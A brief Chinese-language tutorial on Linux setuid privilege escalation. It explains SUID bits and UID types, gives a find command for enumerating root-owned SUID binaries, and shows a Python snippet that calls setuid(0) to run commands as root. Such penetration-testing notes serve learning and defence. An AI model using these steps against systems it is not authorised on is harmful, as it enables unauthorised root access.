# Linux setuid 提权

## 0x00 基础知识

### setuid是什么？
通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令。

ping需要发送ICMP报文，而这个操作需要发送Raw Socket。在Linux 2.2引入CAPABILITIES前，使用Raw Socket是需要root权限的（当然不是说引入CAPABILITIES就不需要权限了，而是可以通过其他方法解决，这个后说），所以你如果在一些老的系统里ls -al $(which ping)，可以发现其权限是-rwsr-xr-x，其中有个s位，这就是suid：

```
ls -al /usr/bin/sudo
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
```
suid全称是Set owner User ID up on execution。这是Linux给可执行文件的一个属性，上述情况下，普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。

设置了s位的程序在运行时，其Effective UID将会设置为这个程序的所有者。比如，/usr/bin/sudo这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其Effective UID就是0，等同于拥有了root权限。

这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID：

- Real UID 执行该进程的用户实际的UID
- Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）
- Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）
- 
通常情况下Effective UID和Real UID相等，所以普通用户不能写入只有UID=0号才可写的/etc/passwd；有suid的程序启动时，Effective UID就等于二进制文件的所有者，此时Real UID就可能和Effective UID不相等了。

### setuid 提权条件
1. 文件所有者是root用户
2. 具备s标志位
3. 程序执行setuid(0)后执行代码



## 0x01 漏洞利用



### 检测setuid文件
```
find / -user root -perm -4000 -print 2>/dev/null
```

### python
如果Python具备s标志位并且是root用户，真实环境几乎没有。   
执行如下：
```
import os
os.setuid(0)
os.system('whoami')
```


[简谈setuid提权](https://www.freebuf.com/articles/web/272617.html) 其中包括一些常见的应用setuid提权方法。     


## Ref

- [谈一谈Linux与suid提权](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)
- [简谈setuid提权](https://www.freebuf.com/articles/web/272617.html) 
